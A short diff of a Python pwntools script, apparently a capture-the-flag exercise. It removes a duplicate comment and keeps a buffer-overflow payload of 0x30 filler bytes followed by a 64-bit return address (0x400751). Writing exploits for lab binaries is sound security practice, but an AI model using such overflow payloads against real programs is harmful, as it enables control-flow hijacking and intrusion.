@@ -1,6 +1,5 @@
 from pwn import *
 
-#junk = "A" * 0x30  # Why not 0x30
 junk = "A" * 0x30
 #address = "\x96\x05\x40\x00\x00\x00\x00"
 payload = junk + p64(0x400751)
